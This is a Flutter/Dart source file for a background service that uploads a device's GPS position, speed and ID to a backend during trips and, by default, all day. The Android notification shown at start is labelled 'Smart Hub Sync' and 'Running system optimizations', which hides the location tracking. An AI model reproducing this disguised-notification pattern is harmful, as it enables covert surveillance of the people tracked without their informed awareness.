import 'dart:async';
import 'dart:ui';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:geolocator/geolocator.dart';
import 'package:intl/intl.dart';
import 'dart:convert';
import '../constants/api_constants.dart';
import 'api_service.dart';
import 'trip_service.dart';
import '../models/trip_model.dart';
import 'device_service.dart';

class LocationTrackingService {
  static final LocationTrackingService _instance =
      LocationTrackingService._internal();
  factory LocationTrackingService() => _instance;
  LocationTrackingService._internal();

  static Future<void> initializeService() async {
    final service = FlutterBackgroundService();

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'system_sync_ch',
        initialNotificationTitle: 'Smart Hub Sync',
        initialNotificationContent: 'Running system optimizations',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: false,
        onForeground: onStart,
        onBackground: onIosBackground,
      ),
    );
  }

  /// Verifies if the required location permissions are granted for background tracking
  static Future<bool> checkAlwaysPermission() async {
    LocationPermission permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.always) return true;

    // On Android 10+, background tracking strictly needs 'always'
    // If it's only 'whileInUse', we must request it
    if (permission == LocationPermission.whileInUse || permission == LocationPermission.denied) {
      permission = await Geolocator.requestPermission();
    }

    return permission == LocationPermission.always;
  }

  /// Automatically starts or stops tracking based on approved trip dates and daily tracking settings
  static Future<void> syncTrackingWithTrips() async {
    try {
      // 1. Safety Check: Verify Permissions before starting background service
      // We need 'always' for tracking even when app is closed (Android 10+)
      bool hasAlways = await checkAlwaysPermission();
      
      if (!hasAlways) {
        debugPrint('SYNC_TRACKING: Always permission not granted. Background tracking may fail when app is closed.');
        // Optional: Show a toast or snackbar here if you have context, 
        // but this service is often called from background/main.
      }

      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        debugPrint('SYNC_TRACKING: Permission denied. Aborting.');
        return;
      }

      final apiService = ApiService();
      
      // Fetch dynamic config from backend
      Map<String, dynamic>? config;
      try {
        final resp = await apiService.get(ApiConstants.trackingConfig, includeAuth: true);
        if (resp is Map<String, dynamic>) {
          config = resp;
          final prefs = await SharedPreferences.getInstance();
          await prefs.setString('tracking_config', jsonEncode(config));
        }
      } catch (e) {
        debugPrint('SYNC_TRACKING: Failed to fetch config, using cached/default: $e');
        final prefs = await SharedPreferences.getInstance();
        final cached = prefs.getString('tracking_config');
        if (cached != null) config = jsonDecode(cached);
      }

      final isTrackingActive = config?['is_active'] ?? true;
      if (!isTrackingActive) {
        debugPrint('SYNC_TRACKING: Global tracking is disabled in config.');
        stopTracking();
        return;
      }

      final tripService = TripService();
      final trips = await tripService.fetchTrips();
      final now = DateTime.now();
      final nowDay = DateTime(now.year, now.month, now.day);

      Trip? activeTrip;
      for (var trip in trips) {
        final status = trip.status.toLowerCase();
        bool isViableStatus = status.contains('approved') || status.contains('ongoing') || status.contains('started') || status == 'ready';

        if (isViableStatus) {
          try {
            final startDateString = trip.startDate;
            final endDateString = trip.endDate;
            if (startDateString.isEmpty || endDateString.isEmpty) continue;

            DateTime parseDate(String dateStr) {
              try { return DateTime.parse(dateStr); } catch (_) { return DateFormat('MMM dd, yyyy').parse(dateStr); }
            }

            final startDate = parseDate(startDateString);
            final endDate = parseDate(endDateString);
            final tripStart = DateTime(startDate.year, startDate.month, startDate.day);
            final tripEnd = DateTime(endDate.year, endDate.month, endDate.day);

            if ((nowDay.isAfter(tripStart) || nowDay.isAtSameMomentAs(tripStart)) &&
                (nowDay.isBefore(tripEnd) || nowDay.isAtSameMomentAs(tripEnd))) {
              activeTrip = trip;
              break;
            }
          } catch (e) { debugPrint('SYNC_TRACKING: Date error: $e'); }
        }
      }

      final dailyTrackingEnabled = config?['daily_tracking_active'] ?? true;

      if (activeTrip != null) {
        debugPrint('SYNC_TRACKING: Active trip ${activeTrip.tripId} found.');
        await startTracking(activeTrip.tripId, config: config);
      } else if (dailyTrackingEnabled) {
        debugPrint('SYNC_TRACKING: No trip, but daily tracking is enabled.');
        await startTracking(null, config: config); // Start tracking without trip ID
      } else {
        debugPrint('SYNC_TRACKING: No active trip and daily tracking disabled.');
        stopTracking();
      }
    } catch (e) {
      debugPrint('SYNC_TRACKING: Fatal error: $e');
    }
  }

  static Future<void> syncCurrentLocation(String? tripId) async {
    try {
      bool enabled = await Geolocator.isLocationServiceEnabled();
      var perm = await Geolocator.checkPermission();
      if (!enabled || perm == LocationPermission.denied || perm == LocationPermission.deniedForever) return;

      final position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.medium,
      ).timeout(const Duration(seconds: 15));

      final apiService = ApiService();
      String endpoint;
      Map<String, dynamic> body = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'timestamp': DateTime.now().toIso8601String(),
        'accuracy': position.accuracy,
        'speed': position.speed,
        'device_id': DeviceService().deviceId,
      };

      if (tripId != null) {
        endpoint = '${ApiConstants.trips}$tripId/tracking/';
      } else {
        endpoint = ApiConstants.dailyTracking;
      }

      await apiService.post(endpoint, body: body, includeAuth: true);
      debugPrint('IMMEDIATE LOCATION SYNCED for ${tripId ?? "DAILY"}');
    } catch (e) {
      debugPrint('IMMEDIATE LOCATION SYNC ERROR: $e');
    }
  }

  static Future<void> startTracking(String? tripId, {Map<String, dynamic>? config}) async {
    final prefs = await SharedPreferences.getInstance();
    if (tripId != null) {
      await prefs.setString('active_tracking_trip_id', tripId);
    } else {
      await prefs.remove('active_tracking_trip_id');
    }

    if (config != null) {
      await prefs.setString('tracking_config', jsonEncode(config));
    }

    await syncCurrentLocation(tripId);

    final service = FlutterBackgroundService();
    try {
      if (!await service.isRunning()) {
        await service.startService();
      }
      service.invoke('setTripId', {"tripId": tripId});
      if (config != null) {
        service.invoke('setConfig', config);
      }
    } catch (e) {
      debugPrint('START_TRACKING_ERROR: $e');
    }
  }

  static Future<void> stopTracking() async {
    final prefs = await SharedPreferences.getInstance();
    final tripId = prefs.getString('active_tracking_trip_id');
    if (tripId != null) {
      await syncCurrentLocation(tripId);
    } else {
      await syncCurrentLocation(null);
    }
    
    await prefs.remove('active_tracking_trip_id');
    final service = FlutterBackgroundService();
    if (await service.isRunning()) service.invoke("stopService");
  }
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  WidgetsFlutterBinding.ensureInitialized();
  
  final deviceService = DeviceService();
  await deviceService.init();

  if (service is AndroidServiceInstance) {
    service.setAsForegroundService();
  }
  // Set initial notification info for Android
  if (service is AndroidServiceInstance) {
    service.setForegroundNotificationInfo(
      title: "Smart Hub Sync",
      content: "Running system optimizations",
    );
  }

  await ApiService.loadSession();
  final ApiService apiService = ApiService();
  final prefs = await SharedPreferences.getInstance();
  
  String? currentTripId = prefs.getString('active_tracking_trip_id');
  Map<String, dynamic> config = {};
  final cachedConfig = prefs.getString('tracking_config');
  if (cachedConfig != null) config = jsonDecode(cachedConfig);

  service.on('setTripId').listen((event) {
    currentTripId = event?['tripId'];
  });

  service.on('setConfig').listen((event) {
    if (event != null) config = event;
  });

  StreamSubscription<Position>? positionStream;
  Timer? heartbeatTimer;

  void setupStream() {
    positionStream?.cancel();
    heartbeatTimer?.cancel();

    // DUAL-MODE LOGIC:
    // 1. Daily Tracking (null trip): Strictly time-based as requested (no radius).
    // 2. Trip/Travel (active trip): Movement-based (10m) + Heartbeat (radius + time).
    bool isDaily = currentTripId == null;
    
    // For Daily: No radius needed -> Set filter very high so only timer triggers
    // For Trip: Use 10m radius + time
    double distanceFilter = isDaily ? 99999.0 : (config['distance_filter']?.toDouble() ?? 10.0);
    
    LocationSettings locationSettings;
    if (defaultTargetPlatform == TargetPlatform.android) {
      locationSettings = AndroidSettings(
        accuracy: LocationAccuracy.best,
        distanceFilter: distanceFilter.toInt(),
        forceLocationManager: true, 
      );
    } else {
      locationSettings = AppleSettings(
        accuracy: LocationAccuracy.best,
        distanceFilter: distanceFilter.toInt(),
        pauseLocationUpdatesAutomatically: false,
      );
    }

    // PRIMARY STREAM: Movement driven
    positionStream = Geolocator.getPositionStream(locationSettings: locationSettings).listen((Position? position) async {
      if (position != null) {
        _sendPositionToBackend(position, currentTripId, deviceService, apiService, service);
      }
    });

    // TIME-BASED HEARTBEAT: Based on provided interval or 5m default
    int intervalMinutes = config['tracking_interval_minutes'] ?? 5;
    heartbeatTimer = Timer.periodic(Duration(minutes: intervalMinutes), (timer) async {
      try {
        final position = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        _sendPositionToBackend(position, currentTripId, deviceService, apiService, service);
      } catch (e) {
        debugPrint('TRACKING_HEARTBEAT_ERROR: $e');
      }
    });
    
    debugPrint('TRACKING_MODE_STARTED: ${isDaily ? "DAILY (TIME-ONLY)" : "TRIP (RES: ${distanceFilter}m + TIME)"}');
  }

  service.on('setTripId').listen((event) {
    currentTripId = event?['tripId'];
    setupStream(); // Restart stream with new rules!
  });

  service.on('setConfig').listen((event) {
    if (event != null) {
      config = event;
      setupStream(); // Restart stream with new rules!
    }
  });

  setupStream();

  service.on('stopService').listen((event) {
    positionStream?.cancel();
    heartbeatTimer?.cancel();
    service.stopSelf();
  });
}

/// Helper to unify backend sending logic
Future<void> _sendPositionToBackend(Position position, String? currentTripId, DeviceService deviceService, ApiService apiService, ServiceInstance service) async {
  try {
    final endpoint = currentTripId != null 
        ? '${ApiConstants.trips}$currentTripId/tracking/'
        : ApiConstants.dailyTracking;

    await apiService.post(
      endpoint,
      body: {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'timestamp': DateTime.now().toIso8601String(),
        'accuracy': position.accuracy,
        'speed': position.speed,
        'device_id': deviceService.deviceId,
      },
      includeAuth: true,
    );

    if (service is AndroidServiceInstance) {
      service.setForegroundNotificationInfo(
        title: "TGS Tracking Active",
        content: "Last sync at ${DateFormat('HH:mm').format(DateTime.now())}",
      );
    }
  } catch (e) {
    debugPrint('TRACKING_BACKEND_SEND_ERROR: $e');
  }
}

@pragma('vm:entry-point')
bool onIosBackground(ServiceInstance service) {
  return true;
}
